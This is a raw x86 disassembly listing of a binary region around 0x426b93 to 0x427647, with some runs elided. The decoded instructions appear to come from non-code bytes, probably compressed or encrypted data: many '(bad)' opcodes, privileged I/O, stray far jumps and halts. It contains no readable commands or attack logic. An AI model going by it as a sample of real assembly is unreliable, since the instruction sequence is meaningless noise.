  426b93:	add    BYTE PTR [ebx-0x65e29a15],bh
  426b99:	iret   
  426b9a:	or     BYTE PTR ds:[ecx],ah
  426b9d:	jo     0x426c02
  426b9f:	(bad)  
  426ba0:	icebp  
  426ba1:	dec    ecx
  426ba2:	in     eax,0x77
  426ba4:	test   eax,0x3feee5c1
  426ba9:	dec    eax
  426baa:	clc    
  426bab:	les    edi,FWORD PTR [eax+edi*8]
  426bae:	mov    bl,BYTE PTR [eax+0x35770291]
  426bb4:	add    ebp,edi
  426bb6:	and    DWORD PTR [eax],0x97d5f16f
  426bbc:	cs (bad) 
  426bbe:	pusha  
  426bbf:	cld    
  426bc0:	cmp    BYTE PTR [eax],bh
  426bc2:	add    eax,0x1477c08a
  426bc7:	icebp  
  426bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bc9:	test   DWORD PTR [edx-0x7b],edi
  426bcc:	fadd   st,st(1)
  426bce:	add    BYTE PTR [ebx-0x52],0x76
  426bd2:	je     0x426c29
  426bd4:	call   0x5830:0x8b62bb96
  426bdb:	jmp    0x9b80f32f
  426be0:	hlt    
  426be1:	and    al,0x24
  426be3:	cs ins DWORD PTR es:[edi],dx
  426be5:	jnp    0x426be4
  426be7:	cli    
  426be8:	push   esp
  426be9:	or     ebp,DWORD PTR [ecx+0xce14453]
  426bef:	cmp    esi,DWORD PTR [ebx]
  426bf1:	sbb    BYTE PTR [ebp-0x10],0xdb
  426bf5:	push   es
  426bf6:	div    bh
  426bf8:	inc    ebx
  426bf9:	jo     0x426c4d
  426bfb:	or     esp,edi
  426bfd:	push   ds
  426bfe:	test   BYTE PTR [eax-0xb],dl
  426c01:	pop    ecx
  426c02:	mov    al,ds:0xaabf99da
  426c07:	jb     0x426c21
  426c09:	or     eax,0x642bd9d6
  426c0e:	fimul  WORD PTR [esi+0x0]
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xd2b878cd
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	(bad)
  426c90:	hlt    
  426c91:	xor    BYTE PTR [ecx-0x42],0x11
  426c95:	cs (bad) 
  426c97:	mov    ch,0x52
  426c99:	or     al,0x47
  426c9b:	ss (bad) 
  426c9d:	fs xchg edx,eax
  426c9f:	add    DWORD PTR [edx+0x6f2a26a8],esi
  426ca5:	test   BYTE PTR [ecx],cl
  426ca7:	into   
  426ca8:	mov    eax,ds:0x7c4de5e3
  426cad:	mov    ebp,edx
  426caf:	push   edi
  426cb0:	in     al,0xf
  426cb2:	ss and al,0x99
  426cb5:	jnp    0x426d03
  426cb7:	pop    edx
  426cb8:	cs sub eax,0xcb57818a
  426cbe:	in     al,0x4e
  426cc0:	mov    ds:0x2b4f2857,eax
  426cc5:	push   eax
  426cc6:	adc    cl,cl
  426cc8:	mov    edi,0x99264ba3
  426ccd:	fbld   TBYTE PTR [edx-0x1c0bad11]
  426cd3:	fs push ebp
  426cd5:	fmul   DWORD PTR [ebx-0x60331c5]
  426cdb:	jnp    0x426c7d
  426cdd:	inc    edi
  426cde:	add    DWORD PTR [ebx],edx
  426ce0:	dec    eax
  426ce1:	call   0x847a:0x4fef7ed3
  426ce8:	cmp    eax,0x62b9c243
  426ced:	dec    eax
  426cee:	push   ebp
  426cef:	xlat   BYTE PTR ds:[ebx]
  426cf0:	dec    ebx
  426cf1:	loope  0x426ce4
  426cf3:	scas   al,BYTE PTR es:[edi]
  426cf4:	scas   al,BYTE PTR es:[edi]
  426cf5:	rcl    BYTE PTR [ecx+edi*1],1
  426cf8:	mov    ch,0xe3
  426cfa:	leave  
  426cfb:	jl     0x426d17
  426cfd:	xchg   DWORD PTR [edi-0x14],ebp
  426d00:	jae    0x426d5e
  426d02:	jmp    0xc85d:0x61d618ff
  426d09:	mov    ah,0x67
  426d0b:	leave  
  426d0c:	pop    esp
  426d0d:	shr    BYTE PTR [edi+0x71],0x46
  426d11:	inc    edi
  426d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d13:	arpl   di,bp
  426d15:	mov    al,0x31
  426d17:	inc    edx
  426d18:	mov    ch,al
  426d1a:	push   ds
  426d1b:	shr    BYTE PTR [ebx+0x58be1784],1
  426d21:	in     al,dx
  426d22:	in     al,dx
  426d23:	or     DWORD PTR [esi-0x66],ebx
  426d26:	add    cl,ah
  426d28:	sub    eax,0x227c9875
  426d2d:	in     eax,0x6e
  426d2f:	jmp    0xbf062160
  426d34:	iret   
  426d35:	out    0x76,eax
  426d37:	sahf   
  426d38:	imul   ebx,DWORD PTR [edi],0x94bc4af3
  426d3e:	loopne 0x426d91
  426d40:	pushw  es
  426d42:	or     DWORD PTR [ecx+eiz*8+0x65],eax
  426d46:	fild   DWORD PTR [eax+0x3ff2195b]
  426d4c:	test   al,0x39
  426d4e:	(bad)  
  426d4f:	cdq    
  426d50:	pop    ss
  426d51:	mov    dh,0x78
  426d53:	lds    ebx,FWORD PTR [ebx+ebp*1]
  426d56:	scas   al,BYTE PTR es:[edi]
  426d57:	mov    bh,0x2e
  426d59:	or     esi,esi
  426d5b:	out    0xe6,eax
  426d5d:	and    al,0x1a
  426d5f:	emms   
  426d61:	jne    0x426d5d
  426d63:	retf   0x3008
  426d66:	hlt    
  426d67:	pop    ds
  426d68:	enter  0x2b4,0x4b
  426d6c:	jg     0x426d23
  426d6e:	or     eax,0x76e86aa5
  426d73:	in     eax,0x1a
  426d75:	outs   dx,BYTE PTR ds:[esi]
  426d76:	add    eax,DWORD PTR [edx+0x66]
  426d79:	push   0xed14c56f
  426d7e:	mov    al,0x56
  426d80:	or     eax,0x884c03ca
  426d85:	das    
  426d86:	adc    al,0xfd
  426d88:	je     0x426d45
  426d8a:	xchg   edi,eax
  426d8b:	push   cs
  426d8c:	dec    edi
  426d8d:	jb     0x426dfe
  426d8f:	ret    
	...
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0xc30c:0xc7c2ecf9
  426e01:	mov    ch,0x3f
  426e03:	jg     0x426e09
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	mov    edx,0x2ab1e0ca
  426e11:	and    BYTE PTR [eax+0x59],ah
  426e14:	nop
  426e15:	into   
  426e16:	dec    edi
  426e17:	mov    eax,0xec624830
  426e1c:	and    esp,0x959521f1
  426e22:	(bad)  [ebx]
  426e24:	fidivr WORD PTR [ebx]
  426e26:	dec    esp
  426e27:	pop    ss
  426e28:	sbb    ebp,edx
  426e2a:	div    DWORD PTR cs:[ebx]
  426e2d:	push   esp
  426e2e:	ss (bad) 
  426e31:	sub    esp,esp
  426e33:	mov    WORD PTR [edx-0x11d3e404],cs
  426e39:	xchg   esp,eax
  426e3a:	push   ebx
  426e3b:	push   edi
  426e3c:	fnsave [ecx-0xba22b26]
  426e42:	out    dx,eax
  426e43:	or     esp,DWORD PTR [ecx+0x537fd353]
  426e49:	outs   dx,DWORD PTR ds:[esi]
  426e4a:	and    BYTE PTR [ecx+0xd7b74ee],bh
  426e50:	pop    esp
  426e51:	dec    ecx
  426e52:	clc    
  426e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e54:	js     0x426dfa
  426e56:	js     0x426eb6
  426e58:	and    esp,DWORD PTR [edx+0x4ea7773a]
  426e5e:	xor    BYTE PTR [ebx],dh
  426e60:	fldenv [ebx+esi*1-0x4afcd37c]
  426e67:	add    edi,DWORD PTR ds:0x4ece4eed
  426e6d:	sbb    DWORD PTR [edx+edi*1-0x5f8563e],0xacbfd5eb
  426e78:	mov    eax,ds:0xb2df4d21
  426e7d:	mov    edi,0x2d46ed66
  426e82:	adc    ebx,esp
  426e84:	xchg   esp,eax
  426e85:	test   DWORD PTR [edx+eiz*2-0x7f9e8ee9],ebx
  426e8c:	mov    ebx,0x1a0110f
  426e91:	xor    eax,0x81a0fcba
  426e96:	jmp    0xc9d561c7
  426e9b:	adc    edi,DWORD PTR [esi]
  426e9d:	jecxz  0x426e2a
  426e9f:	cmp    esp,DWORD PTR [edi+0x435721d5]
  426ea5:	ja     0x426ee2
  426ea7:	leave  
  426ea8:	loopne 0x426ef8
  426eaa:	and    al,0x7b
  426eac:	push   0xffffff82
  426eae:	idiv   esi
  426eb0:	iret   
  426eb1:	add    edx,DWORD PTR [ecx]
  426eb3:	imul   bl
  426eb5:	ja     0x426f28
  426eb7:	sahf   
  426eb8:	ret    
  426eb9:	int    0xd9
  426ebb:	jmp    0x426f29
  426ebd:	push   ecx
  426ebe:	clc    
  426ebf:	stos   DWORD PTR es:[edi],eax
  426ec0:	mov    al,ds:0x2ccf91ba
  426ec5:	inc    eax
  426ec6:	xor    BYTE PTR [edx+eax*8+0x8cb7517],ch
  426ecd:	dec    ebx
  426ece:	push   esi
  426ecf:	xor    DWORD PTR [ebx],edi
  426ed1:	inc    ebp
  426ed2:	clc    
  426ed3:	sub    eax,0x505c3862
  426ed8:	or     DWORD PTR [ecx-0x52],0x41
  426edc:	push   eax
  426edd:	daa    
  426ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426edf:	xchg   ebp,eax
  426ee0:	in     al,dx
  426ee1:	cwde   
  426ee2:	daa    
  426ee3:	sbb    DWORD PTR [eax+0x46b3992f],esp
  426ee9:	loopne 0x426ebb
  426eeb:	ficomp DWORD PTR [edx]
  426eed:	add    edi,DWORD PTR [eax]
  426eef:	sar    DWORD PTR [esi-0x3bb428a0],cl
  426ef5:	mov    esi,0xa7797141
  426efa:	sahf   
  426efb:	imul   esp,eax,0x6d
  426efe:	adc    eax,0x67f439ed
  426f03:	aaa    
  426f04:	mov    bl,0x1a
  426f06:	ja     0x426f27
  426f08:	mov    ah,0x5a
  426f0a:	in     eax,dx
  426f0b:	sbb    BYTE PTR [edx-0xe],0x31
  426f0f:	enter  0x0,0x0
	...
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esi+esi*2+0x87df9ab],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	je     0x426f46
  426f8e:	jno    0x426f48
  426f90:	int    0xd5
  426f92:	nop
  426f93:	ror    BYTE PTR [ebx],1
  426f95:	mov    edi,0xe6feb05
  426f9a:	add    esi,DWORD PTR [edx+0x35]
  426f9d:	sub    eax,0x3b2def46
  426fa2:	imul   BYTE PTR [ebp+0x2]
  426fa5:	cmp    DWORD PTR [eax],0x58bf0787
  426fab:	and    ecx,DWORD PTR [ebp-0x37]
  426fae:	xchg   edi,eax
  426faf:	mov    DWORD PTR ds:0x31c9b4c9,ebx
  426fb5:	dec    ebx
  426fb6:	and    ch,BYTE PTR [ecx+esi*8]
  426fb9:	add    al,0xb8
  426fbb:	or     eax,0x7e885e7a
  426fc1:	push   cs
  426fc2:	dec    esp
  426fc3:	jl     0x426faf
  426fc5:	shr    BYTE PTR [ebp-0x16],0x73
  426fc9:	out    0x67,al
  426fcb:	inc    edi
  426fcc:	ins    BYTE PTR es:[edi],dx
  426fcd:	jecxz  0x42702e
  426fcf:	dec    edx
  426fd0:	out    0x56,al
  426fd2:	inc    ebp
  426fd3:	or     ch,BYTE PTR [edx+0x2c3f3c78]
  426fd9:	sahf   
  426fda:	icebp  
  426fdb:	scas   eax,DWORD PTR es:[edi]
  426fdc:	in     al,0x39
  426fde:	cld    
  426fdf:	or     al,0xe2
  426fe1:	pop    es
  426fe2:	add    DWORD PTR [esp+ebp*1],esi
  426fe5:	sub    ebx,ecx
  426fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fe8:	push   es
  426fe9:	jmp    0xb1a5:0xd3e3b877
  426ff0:	sub    ch,BYTE PTR [esp+esi*8-0x7b]
  426ff4:	mov    cl,0xbd
  426ff6:	leave  
  426ff7:	(bad)  
  426ff8:	cmp    bh,dh
  426ffa:	sub    dl,bl
  426ffc:	fcom   DWORD PTR [edi]
  426ffe:	mov    ecx,DWORD PTR [eax-0x32]
  427001:	js     0x426f9e
  427003:	inc    ecx
  427004:	es mov ebx,0x82f3a0dc
  42700a:	add    eax,0xb11766a5
  42700f:	push   edx
  427010:	adc    al,0x92
  427012:	stos   DWORD PTR es:[edi],eax
  427013:	(bad)  
  427014:	into   
  427015:	inc    ecx
  427016:	mov    eax,0xb4a1c3ab
  42701b:	sbb    edx,edx
  42701d:	in     al,0x8a
  42701f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427020:	sbb    DWORD PTR [bx+si+0x11],eax
  427024:	xor    eax,0xb5db1f61
  427029:	add    bl,BYTE PTR ds:0x2dc459d4
  42702f:	or     ebp,edx
  427031:	xchg   ecx,eax
  427032:	pop    ecx
  427033:	push   esp
  427034:	pop    es
  427035:	addr16 push edi
  427037:	sti    
  427038:	cld    
  427039:	retf   
  42703a:	jmp    0x42707e
  42703c:	inc    edx
  42703d:	(bad)  
  427040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427041:	in     eax,dx
  427042:	es aad 0x75
  427045:	popf   
  427046:	lahf   
  427047:	outs   dx,BYTE PTR ds:[esi]
  427048:	dec    esi
  427049:	pop    ds
  42704a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42704c:	div    BYTE PTR [edi]
  42704e:	sbb    dh,dl
  427050:	cmp    al,0x4e
  427052:	out    0x7e,eax
  427054:	test   eax,0x6c2d980d
  427059:	leave  
  42705a:	mov    eax,ds:0x7fe72d8b
  427060:	scas   al,BYTE PTR es:[edi]
  427061:	mov    al,ds:0xf0875084
  427066:	adc    al,0x73
  427068:	sub    DWORD PTR [eax+0x29],ebx
  42706b:	inc    ebx
  42706c:	inc    edi
  42706d:	cmp    dl,BYTE PTR [edi+0x33b4d12c]
  427073:	dec    ebx
  427074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427075:	and    ch,dh
  427077:	test   al,0xcd
  427079:	and    al,0x3
  42707b:	xchg   esp,eax
  42707c:	sbb    al,bl
  42707e:	add    bl,bl
  427080:	lds    edi,FWORD PTR [esi-0x2f43a546]
  427086:	inc    esp
  427087:	jle    0x4270e9
  427089:	das    
  42708a:	in     eax,dx
  42708b:	loope  0x4270dc
  42708d:	clc    
  42708e:	mov    dh,0x84
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x54d89d96
  427102:	jb     0x427148
  427104:	or     al,0xa1
  427106:	add    DWORD PTR [eax],eax
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	xor    DWORD PTR [edi+0x158fb5ea],ebx
  427112:	test   BYTE PTR [edx],dl
  427114:	retf   0x8f54
  427117:	imul   esp,DWORD PTR [esi-0xb100ad1],0x340fd4b
  427121:	fs ror edi,1
  427124:	mov    cl,0x8
  427126:	sbb    al,0x5a
  427128:	jmp    0x427192
  42712a:	jecxz  0x42713a
  42712c:	xchg   ebp,eax
  42712d:	neg    BYTE PTR [edi+0x386aa0d7]
  427133:	and    eax,0x601e5cd7
  427138:	jg     0x4270ef
  42713a:	sar    DWORD PTR [edx+0xf1a4c97],0x45
  427141:	jecxz  0x4271be
  427143:	mov    DWORD PTR [edi+0x24],ecx
  427146:	sahf   
  427147:	push   edx
  427148:	retf   
  427149:	pop    ecx
  42714b:	jae    0x427149
  42714d:	out    0x5c,al
  42714f:	sbb    eax,0x3330ca13
  427154:	push   ss
  427155:	xchg   ebx,eax
  427156:	mov    dh,0xf7
  427158:	in     al,dx
  427159:	jecxz  0x4270f6
  42715b:	xor    al,BYTE PTR [edi]
  42715d:	inc    ecx
  42715e:	jmp    0x3282:0xc268bd50
  427165:	loop   0x427159
  427167:	adc    ecx,edx
  427169:	jo     0x427138
  42716b:	mov    ah,0x39
  42716d:	sbb    dl,al
  42716f:	inc    edx
  427170:	xchg   DWORD PTR [ebp+ebp*1-0x59],ebx
  427174:	clc    
  427175:	mov    eax,0xeb62b5c2
  42717a:	jbe    0x427132
  42717c:	xor    al,BYTE PTR [esi+0x1462b296]
  427182:	js     0x427169
  427184:	aaa    
  427185:	xchg   esi,eax
  427186:	add    BYTE PTR [ebx-0x58],0x51
  42718a:	xor    DWORD PTR [edx],edx
  42718c:	and    ch,BYTE PTR [ebp-0x1]
  42718f:	dec    ecx
  427190:	xor    BYTE PTR [edi-0xf],cl
  427193:	(bad)  
  427194:	in     al,dx
  427195:	lds    esi,FWORD PTR [ecx+0x1f98ad9c]
  42719b:	stos   BYTE PTR es:[edi],al
  42719c:	(bad)  
  42719d:	iret   
  42719e:	fst    QWORD PTR [esi+0xe97c832]
  4271a4:	pop    ss
  4271a5:	mov    eax,ds:0x85b6c29f
  4271aa:	push   es
  4271ab:	leave  
  4271ac:	call   0xce33:0xde6069c7
  4271b3:	aaa    
  4271b4:	imul   esi,DWORD PTR [edx-0x6c940cf9],0xc17b6c0c
  4271be:	xchg   esp,eax
  4271bf:	mov    ebp,0xca0c8992
  4271c4:	inc    edx
  4271c5:	cwde   
  4271c6:	push   esp
  4271c7:	outs   dx,DWORD PTR ds:[esi]
  4271c8:	add    al,0xdd
  4271ca:	arpl   WORD PTR [ebx+0xc845aba],bx
  4271d0:	aam    0x69
  4271d2:	push   ebp
  4271d3:	out    0x74,al
  4271d5:	(bad)  
  4271d6:	mov    eax,0x7ab18914
  4271db:	ins    DWORD PTR es:[edi],dx
  4271dc:	mov    al,ds:0x133554fb
  4271e1:	sbb    ch,BYTE PTR [ecx]
  4271e3:	mov    esi,0xc3728340
  4271e8:	fsub   DWORD PTR [edi+0x74a6ee1c]
  4271ee:	sahf   
  4271ef:	jns    0x4271dc
  4271f1:	xchg   ebx,eax
  4271f2:	jns    0x42718b
  4271f4:	loope  0x427256
  4271f6:	shr    DWORD PTR [edx],1
  4271f8:	not    DWORD PTR ds:0x1cf510be
  4271fe:	loopne 0x42725e
  427200:	dec    eax
  427201:	hlt    
  427202:	fadd   QWORD PTR [esi+ecx*1-0x10125546]
  427209:	clc    
  42720a:	icebp  
  42720b:	dec    esi
  42720c:	cmp    dh,dh
  42720e:	mov    esp,0xe7
	...
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x680073fc,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	fadd   DWORD PTR [edi-0x5a272207]
  427292:	add    BYTE PTR [ecx+0x54ca517c],cl
  427298:	outs   dx,DWORD PTR ds:[esi]
  427299:	mov    esi,0x59b99116
  42729e:	mov    ds:0x96a837a,al
  4272a3:	mov    al,0x72
  4272a5:	jne    0x4272ea
  4272a7:	add    eax,0x1a17fa42
  4272ac:	mov    eax,ds:0xd3a4e572
  4272b1:	or     al,bh
  4272b3:	mov    eax,ds:0x43d60e62
  4272b8:	lea    ecx,[edx-0x166af838]
  4272be:	dec    eax
  4272bf:	sbb    al,0xf0
  4272c1:	out    dx,al
  4272c2:	sub    cl,cl
  4272c4:	imul   edi,DWORD PTR [edx+ebp*8+0x1f5ef080],0xffffffb6
  4272cc:	mov    ebp,0x17351aee
  4272d1:	inc    ecx
  4272d2:	adc    BYTE PTR [ecx],0x82
  4272d5:	xchg   ebp,eax
  4272d6:	jle    0x427261
  4272d8:	adc    al,0x78
  4272da:	sahf   
  4272db:	int    0x64
  4272dd:	inc    ebp
  4272de:	test   eax,0x80424448
  4272e3:	jo     0x4272f4
  4272e5:	push   es
  4272e6:	mov    dh,0xbb
  4272e8:	pop    ecx
  4272e9:	xor    DWORD PTR [eax+0x6eba02ad],esi
  4272ef:	bound  esi,QWORD PTR [eax-0x2e]
  4272f2:	repnz and DWORD PTR [ebp+0x1fb66411],0xffffffdf
  4272fa:	cmp    DWORD PTR [ebp+0x36c640b7],0xffffffaf
  427301:	shl    cl,1
  427303:	pop    ds
  427304:	aaa    
  427305:	lods   eax,DWORD PTR ds:[esi]
  427306:	shr    DWORD PTR [edi+edi*4+0x78d7cac],1
  42730d:	inc    esi
  42730e:	shl    DWORD PTR [edi-0x44],1
  427311:	inc    esi
  427312:	mov    ch,0xee
  427314:	scas   eax,DWORD PTR es:[edi]
  427315:	cmp    BYTE PTR ds:0x183f26ec,bh
  42731b:	pop    ebx
  42731c:	ficom  WORD PTR [ebx-0x6145dfa]
  427322:	xor    DWORD PTR [ecx+0x2ecc421f],edi
  427328:	inc    edi
  427329:	sbb    DWORD PTR [ebx+0x4b944c4c],ebp
  42732f:	push   edi
  427330:	ins    DWORD PTR es:[edi],dx
  427331:	push   eax
  427332:	aaa    
  427333:	pop    esp
  427334:	push   es
  427335:	outs   dx,BYTE PTR ds:[esi]
  427336:	scas   al,BYTE PTR es:[edi]
  427337:	stos   DWORD PTR es:[edi],eax
  427338:	stos   DWORD PTR es:[edi],eax
  427339:	retf   0x75ce
  42733c:	and    DWORD PTR [ecx+0x6d],0x944dfc0e
  427343:	lock mov esi,0xc0bfceac
  427349:	inc    edi
  42734a:	jg     0x427341
  42734c:	cmp    al,0xf
  42734e:	dec    edx
  42734f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427350:	jmp    0x4273cc
  427352:	enter  0xf776,0x37
  427356:	lock adc eax,DWORD PTR [ecx-0x21de9ebd]
  42735d:	rol    BYTE PTR [ebp+0x50ebee40],1
  427363:	and    DWORD PTR [eax-0x712dd207],0x8986e146
  42736d:	xor    al,0xd9
  42736f:	push   ecx
  427370:	fstp   DWORD PTR [edi+0x6c]
  427373:	jg     0x42732e
  427375:	or     eax,0x779db8bf
  42737a:	jns    0x427336
  42737c:	cs (bad) 
  42737e:	fimul  WORD PTR [ecx+0x6]
  427381:	hlt    
  427382:	aad    0xe0
  427384:	or     ebp,DWORD PTR [eax]
  427386:	mov    ds:0x1d86ac32,al
  42738b:	mov    esi,0x1bc9ea9d
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    edx,esi
  427401:	xor    DWORD PTR [esi],ecx
  427403:	adc    BYTE PTR [ebx+eiz*4],0x1
  427407:	add    BYTE PTR [ecx+eax*1],al
  42740a:	add    BYTE PTR [eax],al
  42740c:	mov    ah,0x10
  42740e:	jmp    0x4273af
  427410:	cmp    eax,0x14f8a12c
  427415:	jne    0x4273f4
  427417:	stos   DWORD PTR es:[edi],eax
  427418:	mov    eax,ds:0x5019b30d
  42741d:	out    0xf9,al
  42741f:	xlat   BYTE PTR ds:[ebx]
  427420:	bound  esi,QWORD PTR [ebx+0x2f8eb668]
  427426:	in     eax,dx
  427427:	mov    DWORD PTR [esi],ecx
  427429:	xchg   ebx,eax
  42742a:	dec    edx
  42742b:	xor    al,0xd0
  42742d:	cmc    
  42742e:	sub    al,0x55
  427430:	pop    edx
  427431:	inc    ecx
  427432:	aaa    
  427433:	fcomp  DWORD PTR ds:0xfbc8fc30
  427439:	aas    
  42743a:	jmp    0x86cecd44
  42743f:	push   esp
  427440:	xor    al,0xef
  427442:	cdq    
  427443:	pop    es
  427444:	(bad)  
  427445:	pushf  
  427446:	cld    
  427447:	dec    ecx
  427448:	dec    ebx
  427449:	popf   
  42744a:	leave  
  42744b:	push   ebp
  42744c:	repnz sbb BYTE PTR [edx+ebp*2-0x7672586d],cl
  427454:	inc    ecx
  427455:	ss inc ecx
  427457:	jg     0x4274c1
  427459:	pop    ebp
  42745a:	aad    0x21
  42745c:	cmp    al,BYTE PTR [ebp-0x25609a6b]
  427462:	adc    esp,DWORD PTR [ebx-0x80]
  427465:	mov    esi,0x2aca378c
  42746a:	scas   al,BYTE PTR es:[edi]
  42746b:	xor    eax,0x77aa5eef
  427470:	xor    DWORD PTR [ebx+eiz*1],eax
  427473:	xchg   esi,eax
  427474:	loop   0x427430
  427476:	jns    0x4274cf
  427478:	cmp    al,0x81
  42747a:	nop
  42747b:	xor    DWORD PTR [esi-0x77c887fd],eax
  427481:	pusha  
  427482:	clc    
  427483:	jmp    DWORD PTR [esi]
  427485:	xchg   esi,eax
  427486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427487:	popa   
  427488:	jmp    0x7029:0x413a2250
  42748f:	fist   WORD PTR [edx+ebp*8-0x151c7b2a]
  427496:	cmp    BYTE PTR [ecx-0x75d3cee9],0xfc
  42749d:	shl    DWORD PTR [edi],0xeb
  4274a0:	cli    
  4274a1:	stos   BYTE PTR es:[edi],al
  4274a2:	mov    edx,0xc41f6996
  4274a7:	aad    0xc7
  4274a9:	pop    ds
  4274aa:	push   es
  4274ab:	fidiv  WORD PTR [ebp-0xef17bdf]
  4274b1:	push   ebx
  4274b2:	mov    esp,0x8f21d045
  4274b7:	sbb    DWORD PTR [edx],0xffffff93
  4274ba:	xchg   esp,eax
  4274bb:	nop
  4274bc:	int    0x1a
  4274be:	hlt    
  4274bf:	dec    ecx
  4274c0:	sbb    ebx,DWORD PTR [ecx+esi*2]
  4274c3:	xchg   edx,eax
  4274c4:	add    eax,0x3287c92a
  4274c9:	sbb    bh,BYTE PTR [esi+edx*1]
  4274cc:	and    eax,0x6756e522
  4274d1:	into   
  4274d2:	add    al,0x2a
  4274d4:	imul   ecx,DWORD PTR [eax-0x4895367b],0xffffff99
  4274db:	xor    eax,0xba23967b
  4274e0:	dec    ebx
  4274e1:	fimul  WORD PTR [edx+0x3a0396bd]
  4274e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274e8:	(bad)  
  4274e9:	or     al,0x85
  4274eb:	pop    ds
  4274ec:	adc    DWORD PTR [ecx],0x6dafb9ff
  4274f2:	xchg   BYTE PTR [eax-0x7ca4313],bh
  4274f8:	enter  0x2bf7,0x2f
  4274fc:	cmp    al,0xd6
  4274fe:	jge    0x42752b
  427500:	pop    ss
  427501:	data16 (bad) 
  427503:	pop    edx
  427504:	fisttp QWORD PTR [esi-0x6c]
  427507:	test   BYTE PTR [edi-0x1e045289],al
  42750d:	jnp    0x427554
  42750f:	sub    al,BYTE PTR [eax]
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	mov    al,0xde
  427582:	inc    eax
  427583:	cdq    
  427584:	sbb    BYTE PTR [ecx+eax*1+0x10400],ah
  42758b:	add    BYTE PTR [eax],bl
  42758d:	cmp    eax,ebp
  42758f:	add    edx,0x19
  427592:	outs   dx,DWORD PTR ds:[esi]
  427593:	mov    al,0x36
  427595:	inc    ebp
  427596:	cmp    bl,BYTE PTR [edi-0x19e3b1a0]
  42759c:	daa    
  42759d:	push   esp
  42759e:	rol    DWORD PTR [eax+ebp*2],cl
  4275a1:	sub    eax,0x8bce5d47
  4275a6:	sbb    DWORD PTR [ebx],edx
  4275a8:	add    DWORD PTR [ebx+esi*1+0x5a],ecx
  4275ac:	mov    dh,0xb4
  4275ae:	xor    edx,ebx
  4275b0:	pop    esp
  4275b1:	push   edx
  4275b2:	ds fs loope 0x427596
  4275b6:	enter  0xd4a,0x2a
  4275ba:	push   esi
  4275bb:	add    BYTE PTR [ebx+ebp*2-0x48],cl
  4275bf:	cmp    DWORD PTR [edi],eax
  4275c1:	data16 cld 
  4275c3:	and    al,0x2
  4275c5:	stos   DWORD PTR es:[edi],eax
  4275c6:	xor    al,0xf6
  4275c8:	adc    DWORD PTR [edx+ebx*8],ebx
  4275cb:	xor    ah,ah
  4275cd:	mov    esp,0x209f6435
  4275d2:	ret    
  4275d3:	cld    
  4275d4:	sbb    dl,BYTE PTR [ecx]
  4275d6:	jb     0x427594
  4275d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275d9:	or     bl,BYTE PTR [esi-0x304c482e]
  4275df:	jmp    0x348a0af4
  4275e4:	xor    cl,BYTE PTR [ebx+0x43d08e55]
  4275ea:	push   edi
  4275eb:	(bad)  
  4275ec:	fistp  QWORD PTR [eax+0x15d10ff2]
  4275f2:	adc    eax,0x6c0b801c
  4275f7:	dec    esp
  4275f8:	lods   al,BYTE PTR ds:[esi]
  4275f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275fa:	add    dh,BYTE PTR [ebp-0x7b]
  4275fd:	enter  0x79f9,0x8c
  427601:	pop    esi
  427602:	out    dx,eax
  427603:	xor    al,0xf0
  427605:	popf   
  427606:	loopne 0x42766a
  427608:	shr    BYTE PTR [edi-0x27],1
  42760b:	adc    al,0xd6
  42760d:	mov    ah,0xe2
  42760f:	mov    ds:0x374a21ea,eax
  427614:	lock mov bl,0x3b
  427617:	sub    bh,BYTE PTR [edi]
  427619:	fisttp QWORD PTR [ebp+0x3d0e9538]
  42761f:	enter  0x669b,0x9f
  427623:	mov    ds:0x65807cf3,eax
  427628:	mov    ebp,0x2efdd797
  42762d:	imul   esi,edx,0xbe601b79
  427633:	mov    ecx,0x2fdb12be
  427638:	mov    esp,0xda97bb6c
  42763d:	cmp    al,0x2d
  42763f:	or     ah,BYTE PTR [ebp-0x5e7da872]
  427645:	ins    BYTE PTR es:[edi],dx
  427646:	inc    ecx
  427647:	popf   
